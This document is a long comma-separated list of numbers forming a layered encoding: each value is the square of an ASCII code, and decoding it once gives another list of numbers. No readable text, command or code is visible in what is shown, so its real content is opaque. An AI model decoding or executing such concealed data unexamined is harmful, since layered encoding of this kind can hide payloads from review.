,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,3249,3136,2304,2401,1936,3249,3136,2304,2401,1936,2809,2601,2500,3249,1936,2401,2601,3249,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,3249,3136,2304,2401,1936,2500,3249,2401,2916,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2916,2809,2916,2401,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2401,2916,2916,2704,1936,2401,2601,3249,2500,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2809,2601,2500,3249,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2401,2916,2916,2704,1936,2809,2601,2500,3249,1936,2401,2401,2916,2916,2704,1936,2401,2601,2500,2500,2809,1936,2916,2809,2916,2401,1936,2401,2601,2500,2500,2809,1936,2401,2601,2500,2500,2809,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2809,2601,2500,3249,1936,3249,3136,2304,2401,1936,2500,3025,2304,2704,1936,2401,2304,2500,2304,2401,1936,2500,3025,2304,2704,1936,3249,3136,2304,2401,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2601,2500,2500,2809,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2401,2601,2500,2500,2809,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,3249,3136,2304,2401,1936,2401,2401,2916,2916,2704,1936,2809,2601,2500,3249,1936,2500,3025,2304,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2601,3249,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2500,3025,2304,2704,1936,3025,3025,2704,2704,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2809,2601,2500,3249,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,2401,2304,2500,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2916,2809,2916,2401,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2601,2500,2500,2809,1936,3249,3136,2304,2401,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3249,3136,2304,2401,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2401,2601,3249,2500,2704,1936,2401,2401,2916,2916,2704,1936,2500,3249,2401,2916,1936,2401,2401,2916,2916,2704,1936,3025,3025,2704,2704,1936,3025,3025,2704,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2304,2401,1936,2401,2304,2500,2304,2401,1936,2401,2601,3249,2500,2704,1936,2500,3025,2304,2704,1936,3249,3136,2304,2401,1936,2500,3249,2401,2916,1936,2401,2304,2500,2304,2401,1936,2809,2601,2500,3249,1936,2916,2809,2916,2401,1936,2809,2601,2500,3249,1936,2401,2401,2809,2916,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3136,2916,2704,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2500,2601,2916,1936,3249,2304,2500,2809,1936,2500,2704,2304,2401,1936,2401,2304,3136,2401,2916,1936,3249,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2601,2401,2601,2916,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2304,3136,3249,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2401,2500,2401,2304,2304,1936,2401,2704,2401,2916,2401,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2304,3136,2401,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2500,2601,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2500,2601,2304,2704,1936,2401,2704,2916,2704,2401,1936,2916,3025,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,2500,2601,2916,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2704,2916,2500,2704,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2809,2500,2401,1936,2401,3136,2704,3249,1936,2401,2401,2809,2916,1936,2401,2809,2500,2401,1936,2401,2401,2809,2916,1936,2401,3136,2704,3249,1936,2401,2809,2500,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,3136,2401,2916,1936,2401,2304,2704,2304,2704,1936,2401,2401,2500,2601,2916,1936,3249,2304,2500,2809,1936,3249,2916,2304,2704,1936,2601,2401,2601,2916,1936,2401,2401,3136,3136,2401,1936,3249,2304,2500,2809,1936,2500,2601,2304,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,3025,2601,3249,2916,1936,2401,2304,2704,2304,2704,1936,2500,2601,2304,2704,1936,2401,2704,2916,2704,2401,1936,2916,3025,2500,2704,1936,2704,2601,2809,2916,1936,2401,2401,2500,2601,2916,1936,2809,2304,2704,2401,1936,2601,2401,2601,2916,1936,2704,2916,2500,2704,1936,2809,2304,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2704,2401,2916,2401,1936,3249,2916,2304,2704,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2401,3136,3136,2401,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2601,2704,2809,2916,1936,2401,2304,2304,2304,2304,1936,2809,2304,2704,2401,1936,2401,2500,2809,2704,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2916,2304,2304,1936,2401,2916,2304,2304,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2401,2500,2601,2916,1936,3025,2601,3249,2916,1936,2401,2601,2916,3136,3249,1936,2809,2916,2500,2809,1936,2401,2304,2500,2704,1936,3025,3025,2704,2704,1936,2916,2809,2916,2401,1936,3025,3025,2704,2704,1936,2401,2304,2500,2304,2401,1936,2500,3025,2304,2704,1936,2401,2916,3136,2401,1936,2401,2916,3136,2401,1936,2401,2304,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2401,2304,2500,2704,1936,2401,2809,2401,2500,3249,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2401,2704,2401,2916,2401,1936,2601,2401,2601,2916,1936,2601,2304,2500,2809,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,2500,3025,2304,2704,1936,2809,2601,2500,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2809,2916,2500,2809,1936,2809,2304,2704,2401,1936,2704,2916,2500,2704,1936,2500,2601,2304,2704,1936,2401,2304,2704,2304,2704,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2304,2500,2704,1936,3249,3136,2304,2401,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2809,2916,2500,2809,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2401,2809,2916,1936,2500,2916,2304,2401,1936,2401,2704,2401,2916,2401,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2809,2304,2704,2401,1936,2916,3025,2500,2704,1936,3025,2601,3249,2916,1936,2401,2304,2500,2704,1936,3249,2916,2304,2704,1936,2809,2304,2704,2401,1936,2401,2601,2916,3136,3249,1936,2401,2304,2500,2704,1936,2401,2401,3136,3136,2401,1936,2401,2304,2304,2304,2304,1936,2500,2601,2304,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2601,2916,3136,3249,1936,2704,2916,2500,2704,1936,2401,2401,2809,2916,1936,2601,2704,3136,2401,1936,2401,2916,3249,1936,2401,2304,2304,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2401,2304,2500,2704,1936,2809,2704,3025,2916,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,2809,2401,3136,2704,1936,3025,2809,2916,3249,1936,3025,2601,3249,2916,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3249,2304,2500,2809,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2304,2500,2704,1936,2601,3025,2500,2401,1936,2401,2304,2500,2704,1936,2916,3025,2500,2704,1936,2401,2704,2401,2916,2401,1936,2401,2500,2401,2304,2304,1936,3025,2809,2916,3249,1936,2601,2500,2704,3249,1936,2500,2601,2304,2704,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,3025,2809,2916,3249,1936,2401,2401,3136,3136,2401,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,2704,2601,2809,2916,1936,2500,2601,2304,2704,1936,3025,2601,3249,2916,1936,2401,2500,2601,2500,2401,1936,3025,2809,2916,3249,1936,2401,2601,2916,3136,3249,1936,2401,2704,2401,2916,2401,1936,3025,2809,2916,3249,1936,2401,2704,2916,2704,2401,1936,2809,2916,2500,2809,1936,2500,2601,2304,2704,1936,2401,2304,2500,2704,1936,3136,2500,3136,2401,1936,2401,2401,2809,2916,1936,2809,2704,3025,2916,1936,2809,2401,3136,2704,1936,3025,2601,3249,2916,1936,2401,2500,3249,3249,2916,1936,2500,2601,2304,2704,1936,2601,2401,2601,2916,1936,2916,3025,2500,2704,1936,2401,2401,2809,2916,1936,2401,3249,2601,2916,1936,2601,2304,2500,2809,1936,2401,2704,2401,2916,2401,1936,2704,2916,2500,2704,1936,2809,2704,3025,2916,1936,2809,2916,2500,2809,1936,3025,2809,2916,3249,1936,3249,2704,2304,3249,1936,2401,2500,2401,2304,2304,1936,2916,3025,2500,2704,1936,2809,2916,2500,2809,1936,2809,2916,2500,2809,1936,3136,2916,2704,3249,1936